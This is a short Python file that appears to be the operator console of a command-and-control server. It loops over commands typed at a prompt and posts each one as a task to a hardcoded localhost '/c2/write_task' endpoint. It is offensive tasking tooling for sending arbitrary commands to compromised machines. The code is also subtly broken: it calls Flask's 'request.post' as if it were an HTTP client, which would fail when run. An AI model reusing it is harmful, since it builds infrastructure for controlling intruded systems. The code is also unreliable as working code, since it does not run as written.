from flask import Flask, request, jsonify
from config import crypto_gen




# This for testing API, Check and change soon after ! ! 
def get_command():
    while (True):
        command = input ("Command>")
        if command.lower() == "exit":
            break

        response = request.post("http://localhost:5000/c2/write_task", json={"task": command})   #This will obviously not be hardcoded
        if response.status_code == 200:
            print(response.json().get('message'))

        else:
            print(f"Error: {response.status_code}, {response.text}")